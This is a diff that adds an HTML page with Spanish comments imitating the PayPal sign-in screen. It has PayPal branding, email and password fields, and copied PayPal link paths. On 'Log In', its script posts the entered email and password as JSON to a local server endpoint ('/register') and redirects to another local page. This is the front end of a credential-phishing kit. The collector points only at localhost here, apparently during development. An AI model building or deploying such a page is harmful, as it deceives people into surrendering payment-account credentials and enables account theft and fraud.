@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logo Solo PayPal</title>
+    <style>
+        /* Estilos generales */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .paypal-logo {
+            width: 46x;  /* Ancho del logo */
+            height: 50px; /* Alto del logo */
+            background-repeat: no-repeat;
+            background-position: center;
+            position: absolute; /* Posiciona el botón de forma independiente */
+            margin-top: 50px; /* Espacio adicional para bajar el campo */
+        }
+
+        #email {
+            width: 338.40px; /* Ajusta el ancho del campo */
+            height: 34px; /* Ajusta la altura del campo */
+            font-size: 18px; /* Tamaño del texto */
+            padding: 12px; /* Espacio interno del campo */
+            border: 2px solid #ccc; /* Grosor y color del borde */
+            border-radius: 0px; /* Esquinas redondeadas */
+            margin-top: 120px; /* Espacio adicional para bajar el campo */
+            position: absolute; /* Posiciona el botón de forma independiente */
+        }
+
+        #password {
+            width: 338.40px; /* Ajusta el ancho del campo */
+            height: 34px; /* Ajusta la altura del campo */
+            font-size: 18px; /* Tamaño del texto */
+            padding: 12px; /* Espacio interno del campo */
+            border: 2px solid #ccc; /* Grosor y color del borde */
+            border-radius: 0px; /* Esquinas redondeadas */
+            margin-top: 200px; /* Espacio adicional para bajar el campo */
+            position: absolute; /* Posiciona el botón de forma independiente */
+        }
+
+        /* Estilos para el enlace de Forgot Password */
+        #forgotPassword {
+             font-weight: bold; /* Aplica negrita al texto */
+             margin-left: -220px; /* Mueve el enlace hacia la derecha */
+             display: inline-block; /* Asegura que el margen izquierdo funcione correctamente */
+             color: #0070ba; /* Color del texto (opcional para estilo) */
+             text-decoration: none; /* Elimina subrayado (opcional) */
+             position: absolute; /* Posiciona el botón de forma independiente */
+             margin-top: 290px; /* Mueve el botón hacia abajo */
+        }
+
+        /* Estilos de los inputs */
+        .input-field {
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 15px;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }   
+
+        /* Estilo específico para el botón Sign Up */
+          #createAccount {
+              margin-top: 440px; /* Mueve el botón hacia abajo */
+              background-color: white; /* Color de fondo blanco */
+              border: 2px solid black; /* Borde negro */
+              color: black; /* Texto negro */
+              width: 366.4px; /* Ajusta el ancho del botón */
+              height: 48px; /* Ajusta la altura del botón */
+              border-radius: 21px; /* Ajusta este valor para hacer las puntas más redondeadas o menos */
+              padding: 14px; /* Aumenta el valor de padding para incrementar la altura */
+              position: absolute; /* Posiciona el botón de forma independiente */
+              font-weight: bold; /* Aplica negrita al texto */
+              font-size: 17px; /* Tamaño de fuente incrementado en 1 unidad */
+        }
+
+        #btnLogin {
+            position: absolute; /* Posiciona el botón de forma independiente */
+            top: 350px; /* Ajusta la distancia desde la parte superior */
+            left: 50%; /* Centra horizontalmente el botón */
+            transform: translateX(-50%); /* Asegura que esté perfectamente centrado */
+            border-radius: 20px; /* Redondea las esquinas */
+            width: 366.4px; /* Ajusta el ancho del botón */
+            height: 48px; /* Ajusta la altura del botón */
+            background-color: #0070ba; /* Color de fondo */
+            color: white; /* Color del texto */
+            border: none; /* Elimina el borde */
+            font-size: 16px; /* Tamaño del texto */
+            cursor: pointer; /* Cambia el cursor a una mano al pasar por encima */
+            font-weight: bold; /* Aplica negrita al texto */
+        }
+
+
+
+        .button:hover {
+            background-color: #005f8d;
+        }
+
+        /* Estilo para el separador */
+        .loginSignUpSeparator {
+            display: flex; /* Alinea los elementos en fila */
+            align-items: center; /* Centra verticalmente los elementos */
+            text-align: center;
+            margin: 400px 0; /* Espacio arriba y abajo */
+            position: absolute; /* Posiciona el separador de forma independiente */
+            width: 366.4px; /* Cambia este valor al ancho deseado */
+            font-weight: bold; /* Aplica negrita al texto */
+        } 
+
+        /* Las líneas con width */
+        .line {
+            width: 366px; /* Aquí defines la longitud exacta de la línea */
+            height: 1px;
+            background-color: #ddd;
+       }
+
+
+        /* Las líneas */
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #ddd;
+        }
+
+        .textInSeparator {
+            padding: 0 10px; /* Espacio a los lados del texto */
+            font-size: 14px;
+            color: #999; /* Texto gris claro */
+            line-height: 1; /* Asegura que la altura de línea no desplace el texto */
+            z-index: 1; /* Asegura que el texto se quede encima de las líneas */
+        }
+
+        /* Barra de pie de página */
+        .footerGroup {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center; /* Centra los elementos */
+            align-items: center;
+            font-size: 12px;
+            padding: 10px 20px;
+            gap: 20px; /* Espacio uniforme entre cada elemento */
+        }
+
+        .footerGroup li {
+            margin: 0; /* Elimina márgenes adicionales */
+        }
+
+        .footerGroup a {
+            text-decoration: none;
+            color: #333333; /* Gris oscuro */
+            font-size: 12px;
+            white-space: nowrap; /* Evita saltos de línea */
+            font-weight: bold; /* Texto en negrita */
+        }
+
+        .footerGroup a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- Logo PayPal sin texto -->
+        <img class="paypal-logo" src="C:\Users\alvar\Downloads\logopaypal.png" alt="PayPal Logo">
+
+
+        <!-- Input para email -->
+        <input id="email" name="login_email" type="email" class="input-field" required="required" autocomplete="off"
+            placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
+
+        <!-- Input para contraseña -->
+        <input id="password" name="login_password" type="password" class="input-field" required="required" value=""
+            placeholder="Password" aria-describedby="passwordErrorMessage">
+
+        <!-- Enlace para recuperar contraseña -->
+        <a href="/authflow/password-recovery/?country.x=FR&amp;locale.x=en_US&amp;redirectUri=%252Fsignin%253Fcountry.x%253DFR%2526locale.x%253Den_US%2526langTgl%253Den"
+            id="forgotPassword" class="recoveryOption forgotPassword" data-client-log-action-type="clickForgotPasswordLink"
+            pa-marked="1">Forgot password?</a>
+
+        <!-- Botón de login -->
+        <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin"
+            name="btnLogin" value="Login" pa-marked="1">Log In</button>
+
+        <!-- Separador -->
+        <div class="loginSignUpSeparator">
+            <div class="line"></div>
+            <span class="textInSeparator">or</span>
+            <div class="line"></div>
+        </div>
+
+        <!-- Botón de Sign Up -->
+        <button type="button" href="/fr/webapps/mpp/account-selection"
+            class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Sign Up</button>
+    </div>
+
+    <script>
+        document.getElementById("btnLogin").addEventListener("click", function () {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            if (email && password) {
+                window.location.href = "file:///C:/Users/alvar/OneDrive/Bureau/paypal/agra.html";
+            } else {
+                alert("Por favor, completa todos los campos.");
+            }
+        });
+    </script>
+
+    <script>
+        document.getElementById("btnLogin").addEventListener("click", function () {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            if (email && password) {
+                fetch("http://127.0.0.1:3000/register", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({ email, password }),
+                })
+                .then((response) => {
+                    if (response.ok) {
+                        alert("Datos enviados correctamente.");
+                    } else {
+                        alert("Error al enviar los datos.");
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error al enviar los datos:", error);
+                });
+            } else {
+                alert("Por favor, completa todos los campos.");
+            }
+        });
+    </script>
+
+
+    <!-- Barra de pie de página -->
+    <ul class="footerGroup">
+        <li><a target="_blank" href="/fr/smarthelp/contact-us" pa-marked="1">Contact Us</a></li>
+        <li><a target="_blank" href="/fr/webapps/mpp/ua/privacy-full" pa-marked="1">Privacy</a></li>
+        <li><a target="_blank" href="/fr/webapps/mpp/ua/legalhub-full" pa-marked="1">Legal</a></li>
+        <li><a target="_blank" href="/fr/webapps/mpp/ua/upcoming-policies-full" pa-marked="1">Policy Updates</a></li>
+        <li><a target="_blank" href="/fr/webapps/mpp/country-worldwide" pa-marked="1">Worldwide</a></li>
+    </ul>
+
+    
+</body>
+
+</html>
